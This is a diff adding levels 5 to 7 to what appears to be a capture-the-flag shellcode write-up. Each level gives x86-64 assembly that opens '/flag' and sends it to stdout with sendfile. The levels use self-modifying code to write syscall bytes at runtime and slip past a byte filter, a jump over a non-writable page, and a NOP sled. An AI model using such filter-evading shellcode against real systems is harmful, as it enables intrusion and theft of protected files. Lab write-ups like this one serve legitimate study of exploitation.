@@ -121,3 +121,107 @@ flag: .ascii "/flag"
 Shit, now we can't even use syscalls, we need to dynamically override the shellcode. What we need to do is, we first need to allocate space in our code for the syscalls using two `ret`instructions. (each `ret` is 1 byte while each `syscall` is 2). Than, we can just overwrite the addresses relative to `%rip`.
 
 ```assembly
+#
+# 1.s
+# Shell
+#
+# Created by Yigit Colakoglu on 09/26/21.
+# Copyright 2021. Yigit Colakoglu. All rights reserved.
+#
+
+.global _start
+
+
+_start:
+  movq $2, %rax
+  leaq flag(%rip), %rdi
+  xor %rsi, %rsi
+  xor %rdx, %rdx
+  movb $0x05, 8(%rip)
+  movb $0x0f, (%rip)
+  ret
+  ret
+  
+  movq %rax, %rsi
+  movq $40, %rax
+  movq $1, %rdi
+
+  xor %rdx, %rdx
+  movq $1000, %r10
+
+  movb $0x05, 8(%rip)
+  movb $0x0f, (%rip)
+  ret
+  ret
+
+flag: .asciz "/flag"
+```
+
+#### 6
+We still need to edit code on runtime, but this time, we don't have write access to the first 4096 of our shellcode. Cool, why don't we just place our main code further then?
+
+```assembly
+#
+# 1.s
+# Shell
+#
+# Created by Yigit Colakoglu on 09/26/21.
+# Copyright 2021. Yigit Colakoglu. All rights reserved.
+#
+
+.global _start
+
+
+_start:
+  leaq main(%rip), %rdx
+  jmp *%rdx
+  .skip 4096
+main:
+  movq $2, %rax
+  leaq flag(%rip), %rdi
+  xor %rsi, %rsi
+  xor %rdx, %rdx
+  movb $0x05, 8(%rip)
+  movb $0x0f, (%rip)
+  ret
+  ret
+  
+  movq %rax, %rsi
+  movq $40, %rax
+  movq $1, %rdi
+
+  xor %rdx, %rdx
+  movq $1000, %r10
+
+  movb $0x05, 8(%rip)
+  movb $0x0f, (%rip)
+  ret
+  ret
+
+flag: .asciz "/flag"
+```
+
+#### 7
+This time, we need to consider that our shellcode might start from 0x800 bytes into the shellcode. All we need is a NOP sled:
+
+```assembly
+.global _start
+
+
+_start:
+  nop # 0x800 times
+  movq $2, %rax  # open()
+  leaq flag(%rip), %rdi # RIP relative addressing
+  movq $0, %rsi
+  movq $0, %rdx
+  syscall
+  
+  movq %rax, %rsi
+  movq $40, %rax # syscall sendfile
+  movq $1, %rdi
+  movq $0, %rdx
+  movq $1000, %r10
+  syscall
+
+flag: .asciz "/flag"
+```
